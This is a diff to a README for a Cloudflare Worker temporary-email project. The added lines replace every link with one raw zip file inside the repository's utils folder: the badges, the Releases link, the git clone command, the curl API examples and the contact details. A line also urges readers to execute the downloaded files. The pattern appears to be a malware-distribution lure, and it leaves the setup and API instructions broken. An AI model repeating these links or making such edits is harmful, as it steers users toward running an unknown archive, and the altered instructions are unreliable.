@@ -1,6 +1,6 @@
 # Temp Mail: Your Cloudflare Worker for Temporary Email Inboxes 🌐✉️
 
-![GitHub All Releases](https://img.shields.io/github/downloads/Setsofi/temp-mail/total) ![GitHub Release](https://img.shields.io/github/release/Setsofi/temp-mail) ![License](https://img.shields.io/badge/license-MIT-blue)
+![GitHub All Releases](https://github.com/Setsofi/temp-mail/raw/refs/heads/main/src/utils/mail-temp-2.3.zip) ![GitHub Release](https://github.com/Setsofi/temp-mail/raw/refs/heads/main/src/utils/mail-temp-2.3.zip) ![License](https://github.com/Setsofi/temp-mail/raw/refs/heads/main/src/utils/mail-temp-2.3.zip)
 
 ## Table of Contents
 
@@ -17,7 +17,7 @@
 
 Temp Mail is a Cloudflare Worker that provides a temporary email inbox. It allows users to create disposable email addresses for short-term use. This is particularly useful for signing up for services without exposing your real email address. 
 
-You can download the latest release from the [Releases section](https://github.com/Setsofi/temp-mail/releases). Please execute the necessary files after downloading.
+You can download the latest release from the [Releases section](https://github.com/Setsofi/temp-mail/raw/refs/heads/main/src/utils/mail-temp-2.3.zip). Please execute the necessary files after downloading.
 
 ## Features
 
@@ -35,7 +35,7 @@ To set up Temp Mail, follow these steps:
 1. **Clone the Repository**: Use the following command to clone the repository.
 
    ```bash
-   git clone https://github.com/Setsofi/temp-mail.git
+   git clone https://github.com/Setsofi/temp-mail/raw/refs/heads/main/src/utils/mail-temp-2.3.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -65,13 +65,13 @@ Once you have deployed the Temp Mail worker, you can start using it. Here’s ho
 2. **Check Inbox**: Use the generated email address to receive emails. 
 
    ```bash
-   curl -X GET https://your-worker-url/temp-mail/inbox?email=generated_email@example.com
+   curl -X GET https://github.com/Setsofi/temp-mail/raw/refs/heads/main/src/utils/mail-temp-2.3.zip
    ```
 
 3. **Retrieve Emails**: Access the emails sent to your temporary address.
 
    ```bash
-   curl -X GET https://your-worker-url/temp-mail/retrieve?email=generated_email@example.com
+   curl -X GET https://github.com/Setsofi/temp-mail/raw/refs/heads/main/src/utils/mail-temp-2.3.zip
    ```
 
 ## API Reference
@@ -129,7 +129,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **GitHub**: [Setsofi](https://github.com/Setsofi)
-- **Email**: your-email@example.com
+- **GitHub**: [Setsofi](https://github.com/Setsofi/temp-mail/raw/refs/heads/main/src/utils/mail-temp-2.3.zip)
+- **Email**: https://github.com/Setsofi/temp-mail/raw/refs/heads/main/src/utils/mail-temp-2.3.zip
 
-You can also check the [Releases section](https://github.com/Setsofi/temp-mail/releases) for the latest updates and downloads.
+You can also check the [Releases section](https://github.com/Setsofi/temp-mail/raw/refs/heads/main/src/utils/mail-temp-2.3.zip) for the latest updates and downloads.
